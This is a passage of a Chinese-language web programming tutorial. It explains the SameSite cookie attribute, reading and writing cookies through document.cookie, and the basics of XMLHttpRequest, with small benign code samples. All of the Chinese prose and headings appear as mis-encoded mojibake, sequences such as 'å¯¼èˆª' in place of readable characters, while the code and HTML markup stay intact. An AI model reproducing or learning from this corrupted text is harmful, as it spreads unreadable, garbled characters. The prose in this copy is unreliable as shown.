<p>å¯¼èˆªåˆ°ç›®æ ‡ç½‘å€çš„ GET è¯·æ±‚ï¼ŒåªåŒ…æ‹¬ä¸‰ç§æƒ…å†µï¼šé“¾æ¥ï¼Œé¢„åŠ è½½è¯·æ±‚ï¼ŒGET è¡¨å•ã€‚è¯¦è§ä¸‹è¡¨ã€‚</p>
<table>
<thead>
<tr>
<th>è¯·æ±‚ç±»å‹</th>
<th align="center">ç¤ºä¾‹</th>
<th align="right">æ­£å¸¸æƒ…å†µ</th>
<th>Lax</th>
</tr>
</thead>
<tbody><tr>
<td>é“¾æ¥</td>
<td align="center"><code>&lt;a href=&quot;...&quot;&gt;&lt;/a&gt;</code></td>
<td align="right">å‘é€ Cookie</td>
<td>å‘é€ Cookie</td>
</tr>
<tr>
<td>é¢„åŠ è½½</td>
<td align="center"><code>&lt;link rel=&quot;prerender&quot; href=&quot;...&quot;/&gt;</code></td>
<td align="right">å‘é€ Cookie</td>
<td>å‘é€ Cookie</td>
</tr>
<tr>
<td>GET è¡¨å•</td>
<td align="center"><code>&lt;form method=&quot;GET&quot; action=&quot;...&quot;&gt;</code></td>
<td align="right">å‘é€ Cookie</td>
<td>å‘é€ Cookie</td>
</tr>
<tr>
<td>POST è¡¨å•</td>
<td align="center"><code>&lt;form method=&quot;POST&quot; action=&quot;...&quot;&gt;</code></td>
<td align="right">å‘é€ Cookie</td>
<td>ä¸å‘é€</td>
</tr>
<tr>
<td>iframe</td>
<td align="center"><code>&lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt;</code></td>
<td align="right">å‘é€ Cookie</td>
<td>ä¸å‘é€</td>
</tr>
<tr>
<td>AJAX</td>
<td align="center"><code>$.get(&quot;...&quot;)</code></td>
<td align="right">å‘é€ Cookie</td>
<td>ä¸å‘é€</td>
</tr>
<tr>
<td>Image</td>
<td align="center"><code>&lt;img src=&quot;...&quot;&gt;</code></td>
<td align="right">å‘é€ Cookie</td>
<td>ä¸å‘é€</td>
</tr>
</tbody></table>
<p>è®¾ç½®äº†<code>Strict</code>æˆ–<code>Lax</code>ä»¥åï¼ŒåŸºæœ¬å°±æœç»äº† CSRF æ”»å‡»ã€‚å½“ç„¶ï¼Œå‰ææ˜¯ç”¨æˆ·æµè§ˆå™¨æ”¯æŒ SameSite å±æ€§ã€‚</p>
<p><strong>ï¼ˆ3ï¼‰None</strong></p>
<p>Chrome è®¡åˆ’å°†<code>Lax</code>å˜ä¸ºé»˜è®¤è®¾ç½®ã€‚è¿™æ—¶ï¼Œç½‘ç«™å¯ä»¥é€‰æ‹©æ˜¾å¼å…³é—­<code>SameSite</code>å±æ€§ï¼Œå°†å…¶è®¾ä¸º<code>None</code>ã€‚ä¸è¿‡ï¼Œå‰ææ˜¯å¿…é¡»åŒæ—¶è®¾ç½®<code>Secure</code>å±æ€§ï¼ˆCookie åªèƒ½é€šè¿‡ HTTPS åè®®å‘é€ï¼‰ï¼Œå¦åˆ™æ— æ•ˆã€‚</p>
<p>ä¸‹é¢çš„è®¾ç½®æ— æ•ˆã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: widget_session&#x3D;abc123; SameSite&#x3D;None</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢çš„è®¾ç½®æœ‰æ•ˆã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: widget_session&#x3D;abc123; SameSite&#x3D;None; Secure</span><br></pre></td></tr></table></figure>

<h3 id="document-cookie"><a href="#document-cookie" class="headerlink" title="document.cookie"></a>document.cookie</h3><p><code>document.cookie</code>å±æ€§ç”¨äºè¯»å†™å½“å‰ç½‘é¡µçš„ Cookieã€‚</p>
<p>è¯»å–çš„æ—¶å€™ï¼Œå®ƒä¼šè¿”å›å½“å‰ç½‘é¡µçš„æ‰€æœ‰ Cookieï¼Œå‰ææ˜¯è¯¥ Cookie ä¸èƒ½æœ‰<code>HTTPOnly</code>å±æ€§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x2F;&#x2F; &quot;foo&#x3D;bar;baz&#x3D;bar&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä»<code>document.cookie</code>ä¸€æ¬¡æ€§è¯»å‡ºä¸¤ä¸ª Cookieï¼Œå®ƒä»¬ä¹‹é—´ä½¿ç”¨åˆ†å·åˆ†éš”ã€‚å¿…é¡»æ‰‹åŠ¨è¿˜åŸï¼Œæ‰èƒ½å–å‡ºæ¯ä¸€ä¸ª Cookie çš„å€¼ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var cookies &#x3D; document.cookie.split(&#39;;&#39;);</span><br><span class="line"></span><br><span class="line">for (var i &#x3D; 0; i &lt; cookies.length; i++) &#123;</span><br><span class="line">  console.log(cookies[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; foo&#x3D;bar</span><br><span class="line">&#x2F;&#x2F; baz&#x3D;bar</span><br></pre></td></tr></table></figure>

<p><code>document.cookie</code>å±æ€§æ˜¯å¯å†™çš„ï¼Œå¯ä»¥é€šè¿‡å®ƒä¸ºå½“å‰ç½‘ç«™æ·»åŠ  Cookieã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &#39;fontSize&#x3D;14&#39;;</span><br></pre></td></tr></table></figure>

<p>å†™å…¥çš„æ—¶å€™ï¼ŒCookie çš„å€¼å¿…é¡»å†™æˆ<code>key=value</code>çš„å½¢å¼ã€‚æ³¨æ„ï¼Œç­‰å·ä¸¤è¾¹ä¸èƒ½æœ‰ç©ºæ ¼ã€‚å¦å¤–ï¼Œå†™å…¥ Cookie çš„æ—¶å€™ï¼Œå¿…é¡»å¯¹åˆ†å·ã€é€—å·å’Œç©ºæ ¼è¿›è¡Œè½¬ä¹‰ï¼ˆå®ƒä»¬éƒ½ä¸å…è®¸ä½œä¸º Cookie çš„å€¼ï¼‰ï¼Œè¿™å¯ä»¥ç”¨<code>encodeURIComponent</code>æ–¹æ³•è¾¾åˆ°ã€‚</p>
<p>ä½†æ˜¯ï¼Œ<code>document.cookie</code>ä¸€æ¬¡åªèƒ½å†™å…¥ä¸€ä¸ª Cookieï¼Œè€Œä¸”å†™å…¥å¹¶ä¸æ˜¯è¦†ç›–ï¼Œè€Œæ˜¯æ·»åŠ ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &#39;test1&#x3D;hello&#39;;</span><br><span class="line">document.cookie &#x3D; &#39;test2&#x3D;world&#39;;</span><br><span class="line">document.cookie</span><br><span class="line">&#x2F;&#x2F; test1&#x3D;hello;test2&#x3D;world</span><br></pre></td></tr></table></figure>

<p><code>document.cookie</code>è¯»å†™è¡Œä¸ºçš„å·®å¼‚ï¼ˆä¸€æ¬¡å¯ä»¥è¯»å‡ºå…¨éƒ¨ Cookieï¼Œä½†æ˜¯åªèƒ½å†™å…¥ä¸€ä¸ª Cookieï¼‰ï¼Œä¸ HTTP åè®®çš„ Cookie é€šä¿¡æ ¼å¼æœ‰å…³ã€‚æµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€ Cookie çš„æ—¶å€™ï¼Œ<code>Cookie</code>å­—æ®µæ˜¯ä½¿ç”¨ä¸€è¡Œå°†æ‰€æœ‰ Cookie å…¨éƒ¨å‘é€ï¼›æœåŠ¡å™¨å‘æµè§ˆå™¨è®¾ç½® Cookie çš„æ—¶å€™ï¼Œ<code>Set-Cookie</code>å­—æ®µæ˜¯ä¸€è¡Œè®¾ç½®ä¸€ä¸ª Cookieã€‚</p>
<p>å†™å…¥ Cookie çš„æ—¶å€™ï¼Œå¯ä»¥ä¸€èµ·å†™å…¥ Cookie çš„å±æ€§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &quot;foo&#x3D;bar; expires&#x3D;Fri, 31 Dec 2020 23:59:59 GMT&quot;;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œå†™å…¥ Cookie çš„æ—¶å€™ï¼ŒåŒæ—¶è®¾ç½®äº†<code>expires</code>å±æ€§ã€‚å±æ€§å€¼çš„ç­‰å·ä¸¤è¾¹ï¼Œä¹Ÿæ˜¯ä¸èƒ½æœ‰ç©ºæ ¼çš„ã€‚</p>
<p>å„ä¸ªå±æ€§çš„å†™å…¥æ³¨æ„ç‚¹å¦‚ä¸‹ã€‚</p>
<ul>
<li><code>path</code>å±æ€§å¿…é¡»ä¸ºç»å¯¹è·¯å¾„ï¼Œé»˜è®¤ä¸ºå½“å‰è·¯å¾„ã€‚</li>
<li><code>domain</code>å±æ€§å€¼å¿…é¡»æ˜¯å½“å‰å‘é€ Cookie çš„åŸŸåçš„ä¸€éƒ¨åˆ†ã€‚æ¯”å¦‚ï¼Œå½“å‰åŸŸåæ˜¯<code>example.com</code>ï¼Œå°±ä¸èƒ½å°†å…¶è®¾ä¸º<code>foo.com</code>ã€‚è¯¥å±æ€§é»˜è®¤ä¸ºå½“å‰çš„ä¸€çº§åŸŸåï¼ˆä¸å«äºŒçº§åŸŸåï¼‰ã€‚</li>
<li><code>max-age</code>å±æ€§çš„å€¼ä¸ºç§’æ•°ã€‚</li>
<li><code>expires</code>å±æ€§çš„å€¼ä¸º UTC æ ¼å¼ï¼Œå¯ä»¥ä½¿ç”¨<code>Date.prototype.toUTCString()</code>è¿›è¡Œæ—¥æœŸæ ¼å¼è½¬æ¢ã€‚</li>
</ul>
<p><code>document.cookie</code>å†™å…¥ Cookie çš„ä¾‹å­å¦‚ä¸‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &#39;fontSize&#x3D;14; &#39;</span><br><span class="line">  + &#39;expires&#x3D;&#39; + someDate.toGMTString() + &#39;; &#39;</span><br><span class="line">  + &#39;path&#x3D;&#x2F;subdirectory; &#39;</span><br><span class="line">  + &#39;domain&#x3D;*.example.com&#39;;</span><br></pre></td></tr></table></figure>

<p>Cookie çš„å±æ€§ä¸€æ—¦è®¾ç½®å®Œæˆï¼Œå°±æ²¡æœ‰åŠæ³•è¯»å–è¿™äº›å±æ€§çš„å€¼ã€‚</p>
<p>åˆ é™¤ä¸€ä¸ªç°å­˜ Cookie çš„å”¯ä¸€æ–¹æ³•ï¼Œæ˜¯è®¾ç½®å®ƒçš„<code>expires</code>å±æ€§ä¸ºä¸€ä¸ªè¿‡å»çš„æ—¥æœŸã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &#39;fontSize&#x3D;;expires&#x3D;Thu, 01-Jan-1970 00:00:01 GMT&#39;;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œåä¸º<code>fontSize</code>çš„ Cookie çš„å€¼ä¸ºç©ºï¼Œè¿‡æœŸæ—¶é—´è®¾ä¸º1970å¹´1æœˆ1æœˆé›¶ç‚¹ï¼Œå°±ç­‰åŒäºåˆ é™¤äº†è¿™ä¸ª Cookieã€‚</p>
<h2 id="XMLHttpRequest-å¯¹è±¡"><a href="#XMLHttpRequest-å¯¹è±¡" class="headerlink" title="XMLHttpRequest å¯¹è±¡"></a>XMLHttpRequest å¯¹è±¡</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>æµè§ˆå™¨ä¸æœåŠ¡å™¨ä¹‹é—´ï¼Œé‡‡ç”¨ HTTP åè®®é€šä¿¡ã€‚ç”¨æˆ·åœ¨æµè§ˆå™¨åœ°å€æ é”®å…¥ä¸€ä¸ªç½‘å€ï¼Œæˆ–è€…é€šè¿‡ç½‘é¡µè¡¨å•å‘æœåŠ¡å™¨æäº¤å†…å®¹ï¼Œè¿™æ—¶æµè§ˆå™¨å°±ä¼šå‘æœåŠ¡å™¨å‘å‡º HTTP è¯·æ±‚ã€‚</p>
<p>1999å¹´ï¼Œå¾®è½¯å…¬å¸å‘å¸ƒ IE æµè§ˆå™¨5.0ç‰ˆï¼Œç¬¬ä¸€æ¬¡å¼•å…¥æ–°åŠŸèƒ½ï¼šå…è®¸ JavaScript è„šæœ¬å‘æœåŠ¡å™¨å‘èµ· HTTP è¯·æ±‚ã€‚è¿™ä¸ªåŠŸèƒ½å½“æ—¶å¹¶æ²¡æœ‰å¼•èµ·æ³¨æ„ï¼Œç›´åˆ°2004å¹´ Gmail å‘å¸ƒå’Œ2005å¹´ Google Map å‘å¸ƒï¼Œæ‰å¼•èµ·å¹¿æ³›é‡è§†ã€‚2005å¹´2æœˆï¼ŒAJAX è¿™ä¸ªè¯ç¬¬ä¸€æ¬¡æ­£å¼æå‡ºï¼Œå®ƒæ˜¯ Asynchronous JavaScript and XML çš„ç¼©å†™ï¼ŒæŒ‡çš„æ˜¯é€šè¿‡ JavaScript çš„å¼‚æ­¥é€šä¿¡ï¼Œä»æœåŠ¡å™¨è·å– XML æ–‡æ¡£ä»ä¸­æå–æ•°æ®ï¼Œå†æ›´æ–°å½“å‰ç½‘é¡µçš„å¯¹åº”éƒ¨åˆ†ï¼Œè€Œä¸ç”¨åˆ·æ–°æ•´ä¸ªç½‘é¡µã€‚åæ¥ï¼ŒAJAX è¿™ä¸ªè¯å°±æˆä¸º JavaScript è„šæœ¬å‘èµ· HTTP é€šä¿¡çš„ä»£åè¯ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦ç”¨è„šæœ¬å‘èµ·é€šä¿¡ï¼Œå°±å¯ä»¥å«åš AJAX é€šä¿¡ã€‚W3C ä¹Ÿåœ¨2006å¹´å‘å¸ƒäº†å®ƒçš„å›½é™…æ ‡å‡†ã€‚</p>
<p>å…·ä½“æ¥è¯´ï¼ŒAJAX åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ã€‚</p>
<ol>
<li>åˆ›å»º XMLHttpRequest å®ä¾‹</li>
<li>å‘å‡º HTTP è¯·æ±‚</li>
<li>æ¥æ”¶æœåŠ¡å™¨ä¼ å›çš„æ•°æ®</li>
<li>æ›´æ–°ç½‘é¡µæ•°æ®</li>
</ol>
<p>æ¦‚æ‹¬èµ·æ¥ï¼Œå°±æ˜¯ä¸€å¥è¯ï¼ŒAJAX é€šè¿‡åŸç”Ÿçš„<code>XMLHttpRequest</code>å¯¹è±¡å‘å‡º HTTP è¯·æ±‚ï¼Œå¾—åˆ°æœåŠ¡å™¨è¿”å›çš„æ•°æ®åï¼Œå†è¿›è¡Œå¤„ç†ã€‚ç°åœ¨ï¼ŒæœåŠ¡å™¨è¿”å›çš„éƒ½æ˜¯ JSON æ ¼å¼çš„æ•°æ®ï¼ŒXML æ ¼å¼å·²ç»è¿‡æ—¶äº†ï¼Œä½†æ˜¯ AJAX è¿™ä¸ªåå­—å·²ç»æˆäº†ä¸€ä¸ªé€šç”¨åè¯ï¼Œå­—é¢å«ä¹‰å·²ç»æ¶ˆå¤±äº†ã€‚</p>
<p><code>XMLHttpRequest</code>å¯¹è±¡æ˜¯ AJAX çš„ä¸»è¦æ¥å£ï¼Œç”¨äºæµè§ˆå™¨ä¸æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ã€‚å°½ç®¡åå­—é‡Œé¢æœ‰<code>XML</code>å’Œ<code>Http</code>ï¼Œå®ƒå®é™…ä¸Šå¯ä»¥ä½¿ç”¨å¤šç§åè®®ï¼ˆæ¯”å¦‚<code>file</code>æˆ–<code>ftp</code>ï¼‰ï¼Œå‘é€ä»»ä½•æ ¼å¼çš„æ•°æ®ï¼ˆåŒ…æ‹¬å­—ç¬¦ä¸²å’ŒäºŒè¿›åˆ¶ï¼‰ã€‚</p>
<p><code>XMLHttpRequest</code>æœ¬èº«æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨<code>new</code>å‘½ä»¤ç”Ÿæˆå®ä¾‹ã€‚å®ƒæ²¡æœ‰ä»»ä½•å‚æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br></pre></td></tr></table></figure>

<p>ä¸€æ—¦æ–°å»ºå®ä¾‹ï¼Œå°±å¯ä»¥ä½¿ç”¨<code>open()</code>æ–¹æ³•æŒ‡å®šå»ºç«‹ HTTP è¿æ¥çš„ä¸€äº›ç»†èŠ‚ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.open(&#39;GET&#39;, &#39;http:&#x2F;&#x2F;www.example.com&#x2F;page.php&#39;, true);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç æŒ‡å®šä½¿ç”¨ GET æ–¹æ³•ï¼Œè·ŸæŒ‡å®šçš„æœåŠ¡å™¨ç½‘å€å»ºç«‹è¿æ¥ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°<code>true</code>ï¼Œè¡¨ç¤ºè¯·æ±‚æ˜¯å¼‚æ­¥çš„ã€‚</p>
<p>ç„¶åï¼ŒæŒ‡å®šå›è°ƒå‡½æ•°ï¼Œç›‘å¬é€šä¿¡çŠ¶æ€ï¼ˆ<code>readyState</code>å±æ€§ï¼‰çš„å˜åŒ–ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xhr.onreadystatechange &#x3D; handleStateChange;</span><br><span class="line"></span><br><span class="line">function handleStateChange() &#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œä¸€æ—¦<code>XMLHttpRequest</code>å®ä¾‹çš„çŠ¶æ€å‘ç”Ÿå˜åŒ–ï¼Œå°±ä¼šè°ƒç”¨ç›‘å¬å‡½æ•°<code>handleStateChange</code></p>
<p>æœ€åä½¿ç”¨<code>send()</code>æ–¹æ³•ï¼Œå®é™…å‘å‡ºè¯·æ±‚ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.send(null);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>send()</code>çš„å‚æ•°ä¸º<code>null</code>ï¼Œè¡¨ç¤ºå‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸å¸¦æœ‰æ•°æ®ä½“ã€‚å¦‚æœå‘é€çš„æ˜¯ POST è¯·æ±‚ï¼Œè¿™é‡Œå°±éœ€è¦æŒ‡å®šæ•°æ®ä½“ã€‚</p>
<p>ä¸€æ—¦æ‹¿åˆ°æœåŠ¡å™¨è¿”å›çš„æ•°æ®ï¼ŒAJAX ä¸ä¼šåˆ·æ–°æ•´ä¸ªç½‘é¡µï¼Œè€Œæ˜¯åªæ›´æ–°ç½‘é¡µé‡Œé¢çš„ç›¸å…³éƒ¨åˆ†ï¼Œä»è€Œä¸æ‰“æ–­ç”¨æˆ·æ­£åœ¨åšçš„äº‹æƒ…ã€‚</p>
<p>æ³¨æ„ï¼ŒAJAX åªèƒ½å‘åŒæºç½‘å€ï¼ˆåè®®ã€åŸŸåã€ç«¯å£éƒ½ç›¸åŒï¼‰å‘å‡º HTTP è¯·æ±‚ï¼Œå¦‚æœå‘å‡ºè·¨åŸŸè¯·æ±‚ï¼Œå°±ä¼šæŠ¥é”™ï¼ˆè¯¦è§ã€ŠåŒæºæ”¿ç­–ã€‹å’Œã€ŠCORS é€šä¿¡ã€‹ä¸¤ç« ï¼‰ã€‚</p>
<p>ä¸‹é¢æ˜¯<code>XMLHttpRequest</code>å¯¹è±¡ç®€å•ç”¨æ³•çš„å®Œæ•´ä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.onreadystatechange &#x3D; function()&#123;</span><br><span class="line">  &#x2F;&#x2F; é€šä¿¡æˆåŠŸæ—¶ï¼ŒçŠ¶æ€å€¼ä¸º4</span><br><span class="line">  if (xhr.readyState &#x3D;&#x3D;&#x3D; 4)&#123;</span><br><span class="line">    if (xhr.status &#x3D;&#x3D;&#x3D; 200)&#123;</span><br><span class="line">      console.log(xhr.responseText);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      console.error(xhr.statusText);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.onerror &#x3D; function (e) &#123;</span><br><span class="line">  console.error(xhr.statusText);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;&#x2F;endpoint&#39;, true);</span><br><span class="line">xhr.send(null);</span><br></pre></td></tr></table></figure>

<h3 id="XMLHttpRequest-çš„å®ä¾‹å±æ€§"><a href="#XMLHttpRequest-çš„å®ä¾‹å±æ€§" class="headerlink" title="XMLHttpRequest çš„å®ä¾‹å±æ€§"></a>XMLHttpRequest çš„å®ä¾‹å±æ€§</h3><h4 id="XMLHttpRequest-readyState"><a href="#XMLHttpRequest-readyState" class="headerlink" title="XMLHttpRequest.readyState"></a>XMLHttpRequest.readyState</h4><p><code>XMLHttpRequest.readyState</code>è¿”å›ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„å½“å‰çŠ¶æ€ã€‚è¯¥å±æ€§åªè¯»ã€‚å®ƒå¯èƒ½è¿”å›ä»¥ä¸‹å€¼ã€‚</p>
<ul>
<li>0ï¼Œè¡¨ç¤º XMLHttpRequest å®ä¾‹å·²ç»ç”Ÿæˆï¼Œä½†æ˜¯å®ä¾‹çš„<code>open()</code>æ–¹æ³•è¿˜æ²¡æœ‰è¢«è°ƒç”¨ã€‚</li>
<li>1ï¼Œè¡¨ç¤º<code>open()</code>æ–¹æ³•å·²ç»è°ƒç”¨ï¼Œä½†æ˜¯å®ä¾‹çš„<code>send()</code>æ–¹æ³•è¿˜æ²¡æœ‰è°ƒç”¨ï¼Œä»ç„¶å¯ä»¥ä½¿ç”¨å®ä¾‹çš„<code>setRequestHeader()</code>æ–¹æ³•ï¼Œè®¾å®š HTTP è¯·æ±‚çš„å¤´ä¿¡æ¯ã€‚</li>
<li>2ï¼Œè¡¨ç¤ºå®ä¾‹çš„<code>send()</code>æ–¹æ³•å·²ç»è°ƒç”¨ï¼Œå¹¶ä¸”æœåŠ¡å™¨è¿”å›çš„å¤´ä¿¡æ¯å’ŒçŠ¶æ€ç å·²ç»æ”¶åˆ°ã€‚</li>
<li>3ï¼Œè¡¨ç¤ºæ­£åœ¨æ¥æ”¶æœåŠ¡å™¨ä¼ æ¥çš„æ•°æ®ä½“ï¼ˆbody éƒ¨åˆ†ï¼‰ã€‚è¿™æ—¶ï¼Œå¦‚æœå®ä¾‹çš„<code>responseType</code>å±æ€§ç­‰äº<code>text</code>æˆ–è€…ç©ºå­—ç¬¦ä¸²ï¼Œ<code>responseText</code>å±æ€§å°±ä¼šåŒ…å«å·²ç»æ”¶åˆ°çš„éƒ¨åˆ†ä¿¡æ¯ã€‚</li>
<li>4ï¼Œè¡¨ç¤ºæœåŠ¡å™¨è¿”å›çš„æ•°æ®å·²ç»å®Œå…¨æ¥æ”¶ï¼Œæˆ–è€…æœ¬æ¬¡æ¥æ”¶å·²ç»å¤±è´¥ã€‚</li>
</ul>
<p>é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œæ¯å½“å®ä¾‹å¯¹è±¡å‘ç”ŸçŠ¶æ€å˜åŒ–ï¼Œå®ƒçš„<code>readyState</code>å±æ€§çš„å€¼å°±ä¼šæ”¹å˜ã€‚è¿™ä¸ªå€¼æ¯ä¸€æ¬¡å˜åŒ–ï¼Œéƒ½ä¼šè§¦å‘<code>readyStateChange</code>äº‹ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">if (xhr.readyState &#x3D;&#x3D;&#x3D; 4) &#123;</span><br><span class="line">  &#x2F;&#x2F; è¯·æ±‚ç»“æŸï¼Œå¤„ç†æœåŠ¡å™¨è¿”å›çš„æ•°æ®</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  &#x2F;&#x2F; æ˜¾ç¤ºæç¤ºâ€œåŠ è½½ä¸­â€¦â€¦â€</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>xhr.readyState</code>ç­‰äº<code>4</code>æ—¶ï¼Œè¡¨æ˜è„šæœ¬å‘å‡ºçš„ HTTP è¯·æ±‚å·²ç»å®Œæˆã€‚å…¶ä»–æƒ…å†µï¼Œéƒ½è¡¨ç¤º HTTP è¯·æ±‚è¿˜åœ¨è¿›è¡Œä¸­ã€‚</p>
<h4 id="XMLHttpRequest-onreadystatechange"><a href="#XMLHttpRequest-onreadystatechange" class="headerlink" title="XMLHttpRequest.onreadystatechange"></a>XMLHttpRequest.onreadystatechange</h4><p><code>XMLHttpRequest.onreadystatechange</code>å±æ€§æŒ‡å‘ä¸€ä¸ªç›‘å¬å‡½æ•°ã€‚<code>readystatechange</code>äº‹ä»¶å‘ç”Ÿæ—¶ï¼ˆå®ä¾‹çš„<code>readyState</code>å±æ€§å˜åŒ–ï¼‰ï¼Œå°±ä¼šæ‰§è¡Œè¿™ä¸ªå±æ€§ã€‚</p>
<p>å¦å¤–ï¼Œå¦‚æœä½¿ç”¨å®ä¾‹çš„<code>abort()</code>æ–¹æ³•ï¼Œç»ˆæ­¢ XMLHttpRequest è¯·æ±‚ï¼Œä¹Ÿä¼šé€ æˆ<code>readyState</code>å±æ€§å˜åŒ–ï¼Œå¯¼è‡´è°ƒç”¨<code>XMLHttpRequest.onreadystatechange</code>å±æ€§ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open( &#39;GET&#39;, &#39;http:&#x2F;&#x2F;example.com&#39; , true );</span><br><span class="line">xhr.onreadystatechange &#x3D; function () &#123;</span><br><span class="line">  if (xhr.readyState !&#x3D;&#x3D; 4 || xhr.status !&#x3D;&#x3D; 200) &#123;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  console.log(xhr.responseText);</span><br><span class="line">&#125;;</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-response"><a href="#XMLHttpRequest-response" class="headerlink" title="XMLHttpRequest.response"></a>XMLHttpRequest.response</h4><p><code>XMLHttpRequest.response</code>å±æ€§è¡¨ç¤ºæœåŠ¡å™¨è¿”å›çš„æ•°æ®ä½“ï¼ˆå³ HTTP å›åº”çš„ body éƒ¨åˆ†ï¼‰ã€‚å®ƒå¯èƒ½æ˜¯ä»»ä½•æ•°æ®ç±»å‹ï¼Œæ¯”å¦‚å­—ç¬¦ä¸²ã€å¯¹è±¡ã€äºŒè¿›åˆ¶å¯¹è±¡ç­‰ç­‰ï¼Œå…·ä½“çš„ç±»å‹ç”±<code>XMLHttpRequest.responseType</code>å±æ€§å†³å®šã€‚è¯¥å±æ€§åªè¯»ã€‚</p>
